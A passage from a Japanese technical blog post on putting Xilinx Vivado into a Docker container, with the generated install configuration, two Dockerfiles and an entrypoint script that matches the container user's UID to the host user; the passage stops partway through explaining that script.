Copyright (c) 1986-2018 Xilinx, Inc.  All rights reserved.
INFO : Log file location - /root/.Xilinx/xinstall/xinstall_1536928602376.log
1. Vivado HL WebPACK
2. Vivado HL Design Edition
3. Vivado HL System Edition
4. Documentation Navigator (Standalone)

Please choose: 1

INFO : Config file available at /root/.Xilinx/install_config.txt. Please use -c &lt;filename&gt; to point to this install configuration.
root@a0981b2888bc:/vivado# cp /root/.Xilinx/install_config.txt .</code></pre>
<p>こんな感じにコマンドを実行していくと <code>Xilinx_Vivado_SDK_2018.2_0614_1954.tar.gz</code> を解凍したディレクトリに <code>install_config.txt</code> ができていると思うので、適当な場所にコピーし、必要に応じて修正をしておきます。このディレクトリはもう必要ないので消してしまって大丈夫です。一応生成された <code>install_config.txt</code> を貼っておきます。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode ini"><code class="sourceCode ini"><span id="cb2-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">#### Vivado HL WebPACK Install Configuration ####</span></span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="dt">Edition</span><span class="ot">=</span><span class="st">Vivado HL WebPACK</span></span>
<span id="cb2-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Path where Xilinx software will be installed.</span></span>
<span id="cb2-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="dt">Destination</span><span class="ot">=</span><span class="st">/opt/Xilinx</span></span>
<span id="cb2-6"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-7"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose the Products/Devices the you would like to install.</span></span>
<span id="cb2-8"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="dt">Modules</span><span class="ot">=</span><span class="st">DocNav:1,Kintex UltraScale:1,Virtex UltraScale+ HBM ES:0,Spartan-7:1,Artix-7:1,Model Composer:0,ARM Cortex-A53:1,Zynq UltraScale+ MPSoC:1,Zynq-7000:1,SDK Core Tools:1,ARM Cortex-A9:1,ARM Cortex R5:1,Virtex UltraScale+ 58G ES:0,Zynq UltraScale+ MPSoC ES:0,System Generator for DSP:0,Kintex-7:1,Kintex UltraScale+:1,MicroBlaze:1</span></span>
<span id="cb2-9"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-10"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose the post install scripts you'd like to run as part of the finalization step. Please note that some of these scripts may require user interaction during runtime.</span></span>
<span id="cb2-11"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="dt">InstallOptions</span><span class="ot">=</span><span class="st">Enable WebTalk for SDK to send usage statistics to Xilinx:1</span></span>
<span id="cb2-12"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-13"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="co">## Shortcuts and File associations ##</span></span>
<span id="cb2-14"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose whether Start menu/Application menu shortcuts will be created or not.</span></span>
<span id="cb2-15"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="dt">CreateProgramGroupShortcuts</span><span class="ot">=</span><span class="dv">1</span></span>
<span id="cb2-16"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-17"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose the name of the Start menu/Application menu shortcut. This setting will be ignored if you choose NOT to create shortcuts.</span></span>
<span id="cb2-18"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="dt">ProgramGroupFolder</span><span class="ot">=</span><span class="st">Xilinx Design Tools</span></span>
<span id="cb2-19"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-20"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose whether shortcuts will be created for All users or just the Current user. Shortcuts can be created for all users only if you run the installer as administrator.</span></span>
<span id="cb2-21"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="dt">CreateShortcutsForAllUsers</span><span class="ot">=</span><span class="dv">0</span></span>
<span id="cb2-22"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-23"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-23" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose whether shortcuts will be created on the desktop or not.</span></span>
<span id="cb2-24"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-24" aria-hidden="true" tabindex="-1"></a><span class="dt">CreateDesktopShortcuts</span><span class="ot">=</span><span class="dv">1</span></span>
<span id="cb2-25"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-26"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-26" aria-hidden="true" tabindex="-1"></a><span class="co"># Choose whether file associations will be created or not.</span></span>
<span id="cb2-27"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb2-27" aria-hidden="true" tabindex="-1"></a><span class="dt">CreateFileAssociation</span><span class="ot">=</span><span class="dv">1</span></span></code></pre></div>
<h3 id="docker-イメージの作成">Docker イメージの作成</h3>
<p>今後 Vivado 以外にも GUI アプリケーションを Docker コンテナに閉じ込める機会がありそうだったことから、まず X11 関連のパッケージをインストールした Docker イメージ <code>ubuntu-xorg</code> を作成し、その後このイメージをベースに Vivado をインストールした <code>ubuntu-vivado</code> イメージを作成することにしました。</p>
<p>まず <code>ubuntu-xorg</code> の <code>Dockerfile</code> がこんな感じです。作成したイメージを Docker Hub などを通してグローバルに公開する予定もなかったことから、ミラーサーバを日本のものに変更してしまったりしています。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb3-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">FROM</span> ubuntu:xenial</span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">ENV</span> DEBIAN_FRONTEND noninteractive</span>
<span id="cb3-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb3-6"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-6" aria-hidden="true" tabindex="-1"></a>  <span class="fu">sed</span> <span class="at">-i</span> <span class="at">-e</span> <span class="st">&quot;s%http://[^ ]\+%http://ftp.jaist.ac.jp/pub/Linux/ubuntu/%g&quot;</span> /etc/apt/sources.list <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-7"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-7" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> update <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-8"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-8" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> upgrade <span class="at">-y</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-9"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> <span class="at">-y</span> <span class="at">--no-install-recommends</span> install <span class="dt">\</span></span>
<span id="cb3-10"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-10" aria-hidden="true" tabindex="-1"></a>    ca-certificates curl sudo xorg dbus dbus-x11 ubuntu-gnome-default-settings gtk2-engines <span class="dt">\</span></span>
<span id="cb3-11"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-11" aria-hidden="true" tabindex="-1"></a>    ttf-ubuntu-font-family fonts-ubuntu-font-family-console fonts-droid-fallback lxappearance <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-12"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt-get</span> autoclean <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-13"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt-get</span> autoremove <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-14"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-14" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /var/lib/apt/lists/<span class="pp">*</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-15"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-15" aria-hidden="true" tabindex="-1"></a>  <span class="bu">echo</span> <span class="st">&quot;%sudo ALL=(ALL) NOPASSWD: ALL&quot;</span> <span class="op">&gt;&gt;</span> /etc/sudoers</span>
<span id="cb3-16"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-17"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="kw">ARG</span> gosu_version=1.10</span>
<span id="cb3-18"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb3-19"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-19" aria-hidden="true" tabindex="-1"></a>  <span class="ex">curl</span> <span class="at">-SL</span> <span class="st">&quot;https://github.com/tianon/gosu/releases/download/</span><span class="va">${gosu_version}</span><span class="st">/gosu-</span><span class="va">$(</span><span class="ex">dpkg</span> <span class="at">--print-architecture</span><span class="va">)</span><span class="st">&quot;</span> <span class="dt">\</span></span>
<span id="cb3-20"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-20" aria-hidden="true" tabindex="-1"></a>    <span class="at">-o</span> /usr/local/bin/gosu <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-21"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-21" aria-hidden="true" tabindex="-1"></a>  <span class="ex">curl</span> <span class="at">-SL</span> <span class="st">&quot;https://github.com/tianon/gosu/releases/download/</span><span class="va">${gosu_version}</span><span class="st">/gosu-</span><span class="va">$(</span><span class="ex">dpkg</span> <span class="at">--print-architecture</span><span class="va">)</span><span class="st">.asc&quot;</span> <span class="dt">\</span></span>
<span id="cb3-22"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-22" aria-hidden="true" tabindex="-1"></a>    <span class="at">-o</span> /usr/local/bin/gosu.asc <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-23"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-23" aria-hidden="true" tabindex="-1"></a>  <span class="ex">gpg</span> <span class="at">--keyserver</span> ha.pool.sks-keyservers.net <span class="at">--recv-keys</span> B42F6819007F00F88E364FD4036A9C25BF357DD4 <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-24"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-24" aria-hidden="true" tabindex="-1"></a>  <span class="ex">gpg</span> <span class="at">--verify</span> /usr/local/bin/gosu.asc <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-25"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-25" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /usr/local/bin/gosu.asc /root/.gnupg <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb3-26"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb3-26" aria-hidden="true" tabindex="-1"></a>  <span class="fu">chmod</span> +x /usr/local/bin/gosu</span></code></pre></div>
<p>この <code>Dockerfile</code> を使ってこんな感じでイメージを作成しました。</p>
<pre><code>$ docker image build --rm --no-cache --pull -t ubuntu-xorg .</code></pre>
<p>続いて <code>ubuntu-vivado</code> です。とりあえず、作成した <code>Dockerfile</code> がこんな感じです。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb5-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">FROM</span> ubuntu-xorg</span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="ex">dpkg</span> <span class="at">--add-architecture</span> i386 <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> update <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-6" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt</span> <span class="at">-y</span> <span class="at">--no-install-recommends</span> install <span class="dt">\</span></span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-7" aria-hidden="true" tabindex="-1"></a>    build-essential git gcc-multilib libc6-dev:i386 ocl-icd-opencl-dev libjpeg62-dev <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-8"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-8" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt-get</span> autoclean <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-9"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">apt-get</span> autoremove <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-10"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-10" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /var/lib/apt/lists/<span class="pp">*</span></span>
<span id="cb5-11"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-12"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="kw">COPY</span> install_config.txt /vivado-installer/</span>
<span id="cb5-13"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-14"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="kw">ARG</span> VIVADO_TAR_URI=http://path/to/Xilinx_Vivado_SDK_2018.2_0614_1954.tar.gz</span>
<span id="cb5-15"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="op">\</span></span>
<span id="cb5-16"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-16" aria-hidden="true" tabindex="-1"></a>  <span class="ex">curl</span> <span class="va">${VIVADO_TAR_URI}</span> <span class="kw">|</span> <span class="fu">tar</span> zx <span class="at">--strip-components</span><span class="op">=</span>1 <span class="at">-C</span> /vivado-installer <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-17"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-17" aria-hidden="true" tabindex="-1"></a>  <span class="ex">/vivado-installer/xsetup</span> <span class="dt">\</span></span>
<span id="cb5-18"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-18" aria-hidden="true" tabindex="-1"></a>    <span class="at">--agree</span> 3rdPartyEULA,WebTalkTerms,XilinxEULA <span class="dt">\</span></span>
<span id="cb5-19"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-19" aria-hidden="true" tabindex="-1"></a>    <span class="at">--batch</span> Install <span class="dt">\</span></span>
<span id="cb5-20"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-20" aria-hidden="true" tabindex="-1"></a>    <span class="at">--config</span> /vivado-installer/install_config.txt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb5-21"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-21" aria-hidden="true" tabindex="-1"></a>  <span class="fu">rm</span> <span class="at">-rf</span> /vivado-installer</span>
<span id="cb5-22"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-23"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-23" aria-hidden="true" tabindex="-1"></a><span class="kw">COPY</span> entrypoint.sh /usr/local/bin/entrypoint.sh</span>
<span id="cb5-24"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-24" aria-hidden="true" tabindex="-1"></a><span class="kw">RUN</span> <span class="fu">chmod</span> +x /usr/local/bin/entrypoint.sh</span>
<span id="cb5-25"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="kw">ENTRYPOINT</span> [<span class="st">&quot;/usr/local/bin/entrypoint.sh&quot;</span>]</span>
<span id="cb5-26"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-27"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="kw">CMD</span> [<span class="st">&quot;/bin/bash&quot;</span>, <span class="st">&quot;-l&quot;</span>]</span></code></pre></div>
<p>最初の <a href="https://docs.docker.com/engine/reference/builder/#run"><code>RUN</code></a> は見てわかるとおりいくつかのパッケージをインストールしています。Vivado 自体が依存しているパッケージはほとんど無い<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>ようなのですが、Vivado HLS で OpenCV を使った C simulation を実行しようとした際にいろいろ怒られたのでそれらを追加しています。Git は使えると便利なので入れただけで、必須ではないと思います。</p>
<p>次の <a href="https://docs.docker.com/engine/reference/builder/#copy"><code>COPY</code></a> から <code>RUN</code> で Vivado のインストールをしています。ポイントはインストーラを <code>curl</code> で流し込んでいる点です。インストーラを <code>Dockerfile</code> と同じディレクトリに置く (build context に含める) と、手元の環境ではなぜか高確率で失敗することが多かったほか、作成されるイメージのサイズが大きくなってしまうため、それを防ぐという狙いがあります。その他 <code>curl</code> の出力をそのまま <code>tar</code> に流したり、インストーラの取り込みから関連ファイルの削除までを1つの <code>RUN</code> で行うことで、<code>docker image build</code> したときのえげつないディスクアクセスを低減させたり、イメージの肥大化を防ぐなどの工夫もしています。</p>
<p>この次にやっているのが <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>ENTRYPOINT</code></a> の設定です。これはホストユーザとコンテナ内ユーザの UID を一緒にするための細工で、詳しくは後ほど説明します。とりあえず、ここで <code>COPY</code> している <code>entrypoint.sh</code> がこんな感じです。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="va">UART_GROUP_ID</span><span class="op">=</span><span class="va">${UART_GROUP_ID</span><span class="op">:-</span>20<span class="va">}</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="ot">! </span><span class="fu">grep</span> <span class="at">-q</span> <span class="st">&quot;x:</span><span class="va">${UART_GROUP_ID}</span><span class="st">:&quot;</span> /etc/group<span class="kw">;</span> <span class="cf">then</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-5" aria-hidden="true" tabindex="-1"></a>  <span class="ex">groupadd</span> <span class="at">-g</span> <span class="st">&quot;</span><span class="va">$UART_GROUP_ID</span><span class="st">&quot;</span> uart</span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="cf">fi</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="va">UART_GROUP</span><span class="op">=</span><span class="va">$(</span><span class="fu">grep</span> <span class="at">-Po</span> <span class="st">&quot;^</span><span class="dt">\\</span><span class="st">w+(?=:x:</span><span class="va">${UART_GROUP_ID}</span><span class="st">:)&quot;</span> /etc/group<span class="va">)</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">[[</span> <span class="ot">-n</span> <span class="st">&quot;</span><span class="va">$USER_ID</span><span class="st">&quot;</span> <span class="kw">]];</span> <span class="cf">then</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-10" aria-hidden="true" tabindex="-1"></a>  <span class="ex">useradd</span> <span class="at">-s</span> /bin/bash <span class="at">-u</span> <span class="st">&quot;</span><span class="va">$USER_ID</span><span class="st">&quot;</span> <span class="at">-o</span> <span class="at">-d</span> <span class="st">&quot;</span><span class="va">$PWD</span><span class="st">&quot;</span> user</span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">usermod</span> <span class="at">-aG</span> sudo user</span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">usermod</span> <span class="at">-aG</span> <span class="st">&quot;</span><span class="va">$UART_GROUP</span><span class="st">&quot;</span> user</span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-13" aria-hidden="true" tabindex="-1"></a>  <span class="fu">chown</span> user <span class="va">$(</span><span class="fu">tty</span><span class="va">)</span></span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-14" aria-hidden="true" tabindex="-1"></a>  <span class="bu">exec</span> /usr/local/bin/gosu user <span class="st">&quot;</span><span class="va">$@</span><span class="st">&quot;</span></span>
<span id="cb6-15"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span></span>
<span id="cb6-16"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-16" aria-hidden="true" tabindex="-1"></a>  <span class="bu">exec</span> <span class="st">&quot;</span><span class="va">$@</span><span class="st">&quot;</span></span>
<span id="cb6-17"><a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="cf">fi</span></span></code></pre></div>
<p>適当なディレクトリに <code>Dockerfile</code>、<code>entrypoint.sh</code>、そして <code>install_config.txt</code> を配置し、また <code>Xilinx_Vivado_SDK_2018.2_0614_1954.tar.gz</code> を渡すためのローカルサーバを立てるなどの準備をしたうえで、以下のコマンドでイメージを作成しました。</p>
<pre><code>$ docker image build --rm --no-cache --pull -t ubuntu-vivado .</code></pre>
<h3 id="インストールした-vivado-を使う">インストールした Vivado を使う</h3>
<p>まず、先ほど飛ばした <code>entrypoint.sh</code> によるこれはホストユーザとコンテナ内ユーザの UID を一緒にするための細工を紹介したいと思います。Docker コンテナは、様々な制限が加えられているとはいえ <code>root</code> ユーザで実行されるため、いくつか面倒なことを引き起こします。例えば <a href="https://docs.docker.com/engine/reference/run/#volume-shared-filesystems"><code>--volume</code></a> オプションでマウントした領域にコンテナ内からファイルを作成するとその所有者が <code>root</code> になってしまうなどです。</p>
<p>そこで <code>ENTRYPOINT</code> です。詳しい解説は<a href="https://docs.docker.com/engine/reference/builder/#understand-how-cmd-and-entrypoint-interact">公式ドキュメント</a>にまかせるとして、この <code>ENTRYPOINT</code> を使うとコンテナ内で実行されるコマンドを <code>&lt;ENTRYPOINT に指定したコマンド&gt; &lt;CMD に指定したコマンド&gt;</code> のようにでき、つまり <code>CMD</code> に指定したコマンドを実行する前に任意の処理を実行させることが可能になります。これを利用して、本命のコマンドを実行する前にコンテナ内での作業ユーザを作成してしまおうという作戦です<a href="https://blog.myon.info/entry/2018/09/15/install-xilinx-tools-into-docker-container/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>。</p>
<p>さて上にあげた <code>entrypoint.sh</code> を要約するとこんな感じです。</p>
